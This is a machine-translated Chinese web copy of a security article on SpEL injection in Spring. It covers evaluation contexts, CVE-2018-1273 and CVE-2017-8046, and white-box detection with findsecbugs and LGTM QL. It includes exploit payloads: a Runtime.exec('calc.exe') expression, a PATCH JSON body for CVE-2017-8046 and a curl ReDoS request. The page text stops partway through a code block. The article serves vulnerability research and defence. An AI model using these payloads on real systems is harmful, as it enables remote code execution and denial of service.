<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>😶 🤴🏽 🤴🏻 注射 💬 🌌 🔮</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="前言 


 在工作和研究各种服务的过程中，我们可以逐渐满足Spring框架。 合理的步骤是熟悉其结构和可能的漏洞。 


 对于任何Pentester而言，最有趣的是导致代码执行的漏洞。 


 在Spring中获得RCE的一种方法是注入SpEL表达式。 


 在本文中，我们将尝试了解什么是Sp...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>注射</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/433034/"><img src="https://habrastorage.org/webt/me/ul/p3/meulp3hfrqubkhj4pxdhmslxeca.jpeg"><br><h1 id="intro"> 前言 </h1><br><p> 在工作和研究各种服务的过程中，我们可以逐渐满足Spring框架。 合理的步骤是熟悉其结构和可能的漏洞。 </p><br><p> 对于任何Pentester而言，最有趣的是导致代码执行的漏洞。 </p><br><p> 在Spring中获得RCE的一种方法是注入SpEL表达式。 </p><br><p> 在本文中，我们将尝试了解什么是SpEL，可以在哪里找到它，使用的功能是什么，以及如何找到这种注射剂。 </p><a name="habracut"></a><br><h1 id="what"> 什么啊 </h1><br><p>  <strong>SpEL</strong>是为Spring框架创建的一种表达语言，它在运行时支持对象的查询和图形管理。 <br> 同样重要的是要注意SpEL是作为API创建的，可让您将其集成到其他应用程序和框架中。 </p><br><h1 id="gde-mozhno-vstretit"> 我在哪里见面？ </h1><br><p> 在<strong>Spring Framework中</strong>始终使用SpEL是合乎逻辑的。 一个很好的例子是Spring Security，其中使用SpEL表达式分配权限： </p><br><pre><code class="java hljs"><span class="hljs-meta"><span class="hljs-meta">@PreAuthorize</span></span>(<span class="hljs-string"><span class="hljs-string">"hasPermission(#contact, 'admin')"</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">deletePermission</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Contact contact, Sid recipient, Permission permission)</span></span></span></span>;</code> </pre> <br><p><img src="https://habrastorage.org/webt/2g/rq/gp/2grqgp1bk2lc_ajrxtbl4rcsrq4.png"></p><br><p>  Apache Camel使用SpEL API； 以下是其文档中的示例。 <br> 使用SpEL表达式形成字母： </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">route</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">from</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">uri</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"direct:foo"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">spel</span></span></span><span class="hljs-tag">&gt;</span></span>#{request.headers['foo'] == 'bar'}<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">spel</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">to</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">uri</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"direct:bar"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">route</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p> 或者，您可以使用外部文件中的规则，例如，指定标头： </p><br><pre> <code class="javascript hljs">.setHeader(<span class="hljs-string"><span class="hljs-string">"myHeader"</span></span>).spel(<span class="hljs-string"><span class="hljs-string">"resource:classpath:myspel.txt"</span></span>)</code> </pre> <br><p> 以下是在GitHub上看到的一些示例： <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">https://github.com/jpatokal/openflights</a> </p><br><p><img src="https://habrastorage.org/webt/se/wd/ge/sewdgepwblvm0cslrn30d5glbem.png"></p><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">https://github.com/hbandi/LEP</a> </p><br><p><img src="https://habrastorage.org/webt/xm/nr/h2/xmnrh2rhtdc_eqlfpgqqmukaemu.png"></p><br><h1 id="osnovy-spring-framework-i-spel">  Spring框架和SpEL基础 </h1><br><p> 为了使读者更容易理解什么是SpEL注入，您需要对Spring和SpEL有所了解。 </p><br><p>  Spring框架的关键元素是Spring容器。 容器创建对象，将它们绑在一起，从创建到销毁对它们进行配置和管理。 </p><br><p> 为了控制组成应用程序的组件，Spring Container使用 <br> 依赖注入。 这是使用称为Spring Beans的外部实体（俗称“ beans”）配置对象的时候。 </p><br><p>  Spring Container从Bean检索配置元数据，获取以下信息是必需的：有关实例化哪些对象以及如何通过元数据配置它们的说明。 </p><br><p> 可以通过3种方式获取元数据： </p><br><ul><li>  XML格式 </li><li>  Java注解 </li><li>  Java代码 </li></ul><br><p> 对我们来说，另一个重要点是应用程序上下文。 </p><br><p>  <strong>ApplicationContext</strong>是Spring应用程序中提供应用程序配置信息的主界面。 它在运行时是只读的，但是可以在必要时重新加载并由应用程序支持。 实现ApplicationContext接口的类的数量可用于各种配置参数和应用程序类型。 实际上，它是Spring应用程序本身。 上下文还提供了响应应用程序中发生的各种事件并控制Bean生命周期的能力。 </p><br><p><img src="https://habrastorage.org/webt/gz/pg/td/gzpgtdz46xowwzhkoa4vsld7utq.png"></p><br><p> 现在，让我们直接介绍定义bean和使用SpEL表达式的方法。 </p><br><p>  <strong>Bean.xml</strong> </p><br><p> 典型用法的一个示例是将SpEL集成到XML的创建或bean组件的带注释的定义中： </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">“exmple</span></span></span><span class="hljs-tag">" </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"org.spring.samples.NumberGuess"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"randomNumber"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{ T(java.lang.Math).random() * 100.0 }"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"defaultLocale"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{ systemProperties['user.region'] }"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"defaultLocale2"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"${user.region}"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p> 这是Bean.xml文件中代码的一部分，仅适用于其中的一个bean。 值得注意可通过其访问的bin的ID以及属性。 因为 作为本文的一部分，我们正在考虑使用SpEL的可能性，然后在示例中将提供几种用于编写此类表达式的选项。 </p><br><p> 为了向Spring指示接下来是SpEL表达式，使用了＃字符，并且表达式本身被括在大括号中： <code>#{SpEL_expression}</code> 。 可以使用$字符引用属性，并将属性名称括在大括号中： <code>${someProperty}</code> 。 属性占位符不能包含SpEL表达式，但是表达式可以包含属性引用： </p><br><pre> <code class="json hljs"><span class="hljs-string"><span class="hljs-string">"#{${someProperty}"</span></span></code> </pre> <br><p> 因此，您可以调用我们需要的任何Java类，例如，访问环境变量，这对于确定用户名或系统版本很有用。 </p><br><p> 这种指定bean的方法的便利之处在于可以在不重新编译整个应用程序的情况下更改它们，从而改变应用程序的行为。 </p><br><p> 您可以从应用程序本身使用ApplicationContext接口访问此bean，如下所示： </p><br><pre> <code class="java hljs">ApplicationContext ctx = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ClassPathXmlApplicationContext(“Bean.xml”); MyExpression example = ctx.getBean(“example<span class="hljs-string"><span class="hljs-string">", MyExpression.class); "</span></span> + <span class="hljs-string"><span class="hljs-string">"System.out.println(“Number : "</span></span> + example.getValue()); System.out.println(“Locale : <span class="hljs-string"><span class="hljs-string">" + example.getDefaultLocale()); System.out.println(“Locale : "</span></span> + example.getDefaultLocale2());</code> </pre><br><p> 即 在应用程序内部，我们仅获取包含SpEL表达式的bin参数的值。  Spring收到了这样的值后，将执行该表达式并返回最终结果。 另外，请不要忘记，没有相应的getter，该代码将无法工作，但是其描述不在本文讨论范围之内。 </p><br><p> 指定bean的另一种方法是AnnotationBase注释方法-在某些类的注释内设置参数值。 在这种情况下，不能使用变量。 </p><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">FieldValueTestBean</span></span></span><span class="hljs-class"> @</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Value</span></span></span><span class="hljs-class">("#</span></span>{ systemProperties[<span class="hljs-string"><span class="hljs-string">'user.region'</span></span>] }<span class="hljs-string"><span class="hljs-string">") private String defaultLocale; public void setDefaultLocale(String defaultLocale) { this.defaultLocale = defaultLocale; } public String getDefaultLocale() { return this.defaultLocale; } }</span></span></code> </pre> <br><p> 为了能够使用变量，在创建SpEL表达式时，我们需要使用ExpressionParser接口。 然后，一个类出现在应用程序代码中，类似于以下示例： </p><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parseExpressionInterface</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Person personObj,String property)</span></span></span><span class="hljs-function"> </span></span>{ ExpressionParser parser = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SpelExpressionParser(); Expression exp = parser.parseExpression(property+<span class="hljs-string"><span class="hljs-string">" == 'Input'"</span></span>); StandardEvaluationContext testContext = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StandardEvaluationContext(personObj); <span class="hljs-keyword"><span class="hljs-keyword">boolean</span></span> result = exp.getValue(testContext, Boolean.class);</code> </pre> <br><p>  ExpressionParser将字符串表达式转换为Expression对象。 因此，可以在EvaluationContext框架中获得分析表达式的值。 该EvaluationContext将是唯一可用于EL字符串中所有属性和变量的对象。 </p><br><p> 值得注意的另一个重要事实。 通过这种使用SpEL的方法，如果除了表达式本身之外，它还包含字符串文字，则仅需要字符串表达式包含＃。 </p><br><p> 在以上所有内容中，值得记住两件事： <br>  1）如果可以按应用程序代码搜索，则需要查找这样的关键字：SpelExpressionParser，EvaluationContext和parseExpression。 <br>  2）对Spring <code>#{SpEL}</code> ， <code>${someProperty}</code>和<code>T(javaclass)</code>重要的指针 <br> 如果您想了解有关Spring和SpEL的更多信息，建议您注意<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">docs.spring.io</a>文档。 </p><br><h1 id="chto-voobsche-mozhet-spel">  SpEL可以做什么？ </h1><br><p> 根据文档，SpEL支持以下功能： </p><br><ul><li> 文字表达 </li><li> 布尔运算符和关系运算符 </li><li> 正则表达式 </li><li> 类表达式 </li><li> 访问属性，数组，列表，映射 </li><li> 方法调用 </li><li> 关系运算符 </li><li> 作业 </li><li> 调用构造函数 </li><li>  Bean参考 </li><li> 阵列构造 </li><li> 内联列表 </li><li> 内联地图 </li><li> 三元运算符 </li><li> 变数 </li><li> 用户定义的功能 </li><li> 集合投影 </li><li> 馆藏选择 </li><li> 模板表达式 </li></ul><br><p> 如我们所见，SpEL功能非常丰富，如果用户输入到ExpressionParser中，这可能会对项目的安全性产生不利影响。 因此，Spring本身建议使用简化后的SimpleEvaluationContext而不是功能齐全的StandardEcalutionContext。 </p><br><p> 简而言之，对于我们而言，SimpleEvaluationContext不具有访问Java类和引用其他bean的能力。 </p><br><p> 最好在文档网站上研究功能的完整描述： <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">StandardEvaluationContext</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">SimpleEvaluationContext</a> </p><br><p> 某些更正甚至是基于SpEL功能的不同而进行的，后者在不同的上下文中运行，但是稍后我们将对此进行讨论。 </p><br><p> 为了使所有事情真正清楚，我们举一个例子。 我们有明显的恶意行包含SpEL表达式： </p><br><pre> <code class="java hljs">String inj = <span class="hljs-string"><span class="hljs-string">"T(java.lang.Runtime).getRuntime().exec('calc.exe')"</span></span>;</code> </pre> <br><p> 有两种情况： </p><br><pre> <code class="java hljs">StandardEvaluationContext std_c = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StandardEvaluationContext();</code> </pre> <br><p> 和 </p><br><pre> <code class="java hljs">EvaluationContext simple_c = SimpleEvaluationContext.forReadOnlyDataBinding ().build();</code> </pre> <br><p> 表达式exp = parser.parseExpression（inj）; <br> <code>java exp.getValue(std_c);</code>  - <strong>计算器将启动</strong> <br> <code>java exp.getValue(simple_c);</code>  - <strong>我们会收到一条错误消息</strong> </p><br><p> 同样有趣的一点是，我们无需指定任何上下文就可以开始处理表达式： <code>exp.getValue();</code> <br> 在这种情况下，表达式将在标准上下文中执行，结果，恶意代码将被执行。 因此，如果您是程序员并且使用Spring，请不要忘记设置表达式应在其中执行的上下文。 </p><br><p> 我们早些时候说过，某些更正是基于上下文中SpEL功能之间的差异建立的。 考虑这种修复的示例。 </p><br><p>  <strong>CVE 2018-1273 Spring数据共享</strong> <br> 在setPropertyValue方法中发现此漏洞，它基于两个问题： <br>  1）属于ExpressionParser的变量的值的卫生性不足。 <br>  2）在标准上下文的框架中执行表达式。 </p><br><p> 这是该代码中易受攻击的部分的屏幕截图： </p><br><p><img src="https://habrastorage.org/webt/rb/84/_7/rb84_76_bpq3ywrf-icytp5hvs8.png"></p><br><p> 因为 属性名称不需要在SpEL框架内进行复杂的处理；逻辑解决方案是替换上下文，从而得到以下代码： </p><br><p><img src="https://habrastorage.org/webt/xw/re/ue/xwreueydsgforfjf365mwdrpcuc.png"></p><br><p> 屏幕截图显示了设置上下文和将要执行的表达式的代码部分。 但是表达式的执行发生在其他地方： </p><br><pre> <code class="java hljs">expression.setValue(context, value);</code> </pre> <br><p> 此处表明我们正在针对给定上下文中的值执行SpEL表达式。 <br> 使用SimpleEvaluationContext帮助防止parseExpression中的Java类的实现，现在我们将看到一个错误，而不是在服务器日志中执行代码： </p><br><pre> <code class="java hljs">Type cannot be found <span class="hljs-string"><span class="hljs-string">'java.lang.Runtime'</span></span></code> </pre> <br><p> 但这并不能解决缺乏足够卫生条件的问题，并且保留了进行重做攻击的能力： </p><br><pre> <code class="bash hljs">curl -X POST http://localhost:8080/account -d <span class="hljs-string"><span class="hljs-string">"name['aaaaaaaaaaaaaaaaaaaaaaaa!'%20matches%20'%5E(a%2B)%2B%24']=test"</span></span></code> </pre> <br><p> 因此，下一个修复程序已经包括清除参数名称。 </p><br><h1 id="ot-teorii-k-praktike"> 从理论到实践！ </h1><br><p> 现在让我们看看使用白盒方法搜索SpEL注入的几种方法。 </p><br><h2 id="step-by-step-cve-2017-8046"> 逐步CVE-2017-8046 </h2><br><p> 首先，您需要找到一个处理SpEL表达式的地方。 为此，您只需使用我们的建议并在代码中查找关键字。 回忆这些单词：SpelExpressionParser，EvaluationContext和parseExpression。 </p><br><p> 另一种选择是使用各种插件来查找代码中的错误。 到目前为止，指向可能的SpEL注入的唯一插件是findsecbugs-cli。 <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">https://github.com/find-sec-bugs</a> </p><br><p> 因此，我们找到了我们对代码感兴趣的地方。 假设使用findsecbugs-cli： </p><br><p><img src="https://habrastorage.org/webt/wg/_w/s5/wg_ws5vbnh1z6vds1-gxjc3zhk0.png"></p><br><p> 在应用程序代码中，我们将看到以下内容： </p><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">PathToSpEL</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> SpelExpressionParser SPEL_EXPRESSION_PARSER = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SpelExpressionParser(); <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> List&lt;String&gt; APPEND_CHARACTERS = Arrays.asList(<span class="hljs-string"><span class="hljs-string">"-"</span></span>); <span class="hljs-comment"><span class="hljs-comment">/** * Converts a patch path to an {</span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@link</span></span></span><span class="hljs-comment"> Expression}. * * </span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@param</span></span></span><span class="hljs-comment"> path the patch path to convert. * </span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@return</span></span></span><span class="hljs-comment"> an {</span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@link</span></span></span><span class="hljs-comment"> Expression} */</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> Expression </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">pathToExpression</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String path)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> SPEL_EXPRESSION_PARSER.parseExpression(pathToSpEL(path)); }</code> </pre> <br><p> 下一步是找出路径变量进入表达式解析器的位置。 一种相当方便和免费的方法是使用IntelijIdea IDE函数-分析数据流： </p><br><p><img src="https://habrastorage.org/webt/gd/ud/ag/gdudag-ykwbmvin_70mowuh838u.png"></p><br><p> 通过展开链，例如，替换和研究指定的方法和类，我们得到以下信息： </p><br><p>  ReplaceOperation方法采用路径变量的值。 </p><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ReplaceOperation</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String path, Object value)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">super</span></span>(<span class="hljs-string"><span class="hljs-string">"replace"</span></span>, path, value); }</code> </pre> <br><p> 要调用replace方法，您需要将值“ replace”的变量“ op”传递给JSON。 </p><br><pre> <code class="java hljs">JsonNode opNode = elements.next(); String opType = opNode.get(<span class="hljs-string"><span class="hljs-string">"op"</span></span>).textValue(); <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (opType.equals(<span class="hljs-string"><span class="hljs-string">"replace"</span></span>)) { ops.add(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ReplaceOperation(path, value));</code> </pre> <br><p> 同样，我们找到了用户可以将其所需的值传递给path变量的所有位置。 然后，该漏洞的一种利用选项如下所示： <br> 申请方法：PATCH <br> 要求正文： </p><br><pre> <code class="json hljs">[{ <span class="hljs-attr"><span class="hljs-attr">"op"</span></span> : <span class="hljs-string"><span class="hljs-string">"add"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"path"</span></span> : <span class="hljs-string"><span class="hljs-string">"T(java.lang.Runtime).getRuntime().exec(\"calc.exe\").x"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"value"</span></span> : <span class="hljs-string"><span class="hljs-string">"pwned"</span></span> }]</code> </pre> <br><h2 id="ispolzovanie-lgtm-ql"> 使用LGTM QL </h2><br><p> 使用LGTM QL（出于本文的目的，我们将其简化为QL）是另一种搜索漏洞的有趣方法。 <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">https://lgtm.com</a> </p><br><p> 它应立即规定其不足。 免费的，您只能分析GitHub上开放存储库中的项目，因为 为了拍摄项目的照片，LGTM将项目上载到其服务器并在那里进行编译。 但是，如果这不打扰您，那么LGTM QL将为您提供分析应用程序代码的绝佳机会。 </p><br><p> 那么什么是QL应用程序分析？ </p><br><p> 首先，正如我们已经说过的那样，您将需要创建应用程序的快照。 </p><br><p> 准备好快照后，这可能需要几个小时，您可以开始编写类似SQL的查询，作为QL语法的一部分。 为此，您可以使用Eclipse插件或直接在项目的QL页面上的控制台中执行操作。 </p><br><p> 因为 现在我们正在考虑Spring，这是Java的框架，您将需要描述您感兴趣的类以及该类中的方法，该类的调用被认为是易受攻击的。 对于我们来说，这是任何包含调用ExpressionParser的方法的类。 </p><br><p> 然后，我们选择所有满足我们要求的方法，例如，通过描述将进行消毒的方法中变量的出现以及不属于该方法的条件。 </p><br><p><img src="https://habrastorage.org/webt/or/cs/bu/orcsbusthzp51u1y_l0wuupohe8.png"></p><br><p> 那么，要找到CVE漏洞2018-1273需要做什么？ <br> 接收并连接了项目映像后，我们使用QL控制台描述了我们感兴趣的调用树。 为此： <br> 我们描述表达式解析器类： </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ExpressionParser</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">RefType</span></span></span><span class="hljs-class"> </span></span>{ ExpressionParser() { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.hasQualifiedName(<span class="hljs-string"><span class="hljs-string">"org.springframework.expression"</span></span>, <span class="hljs-string"><span class="hljs-string">"ExpressionParser"</span></span>) } }</code> </pre> <br><p> 以及可以在ExpressionParser类中执行的方法： </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ParseExpression</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MethodAccess</span></span></span><span class="hljs-class"> </span></span>{ ParseExpression() { exists (Method m | (m.getName().matches(<span class="hljs-string"><span class="hljs-string">"parse%"</span></span>) or m.hasName(<span class="hljs-string"><span class="hljs-string">"doParseExpression"</span></span>)) and <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getMethod() = m ) } }</code> </pre> <br><p> 现在，您需要将这些描述相互关联并进行选择： </p><br><pre> <code class="sql hljs">from ParseExpression expr where (expr.getQualifier().getType().(RefType).getASupertype*() instanceof ExpressionParser) <span class="hljs-keyword"><span class="hljs-keyword">select</span></span> expr</code> </pre> <br><p> 这样的查询将返回所有以parse或名称doParseExpression开头的方法，这些方法将属于ExpressionParser类。 但是，您说那太多了，您将是对的。 需要一个过滤器。 </p><br><p> 因为 在代码中有以下形式的注释： </p><br><pre> <code class="sql hljs">* Converts a patch path to an {@link Expression}. * * @param path the patch path to convert.</code> </pre> <br><p> 例如，这可能是在Javadoc中搜索“路径”。  Spring以很高的质量对其代码进行注释，我们可以找到带有必要注释的方法调用，同时删除测试中包括的所有方法。 所有这些可以描述如下： </p><br><pre> <code class="java hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">CallHasPath</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Callable</span></span></span><span class="hljs-class"> </span></span>{ CallHasPath() { not <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getDeclaringType() <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">instanceof</span></span></span><span class="hljs-function"> TestClass </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">and</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">( </span></span><span class="hljs-keyword"><span class="hljs-function"><span 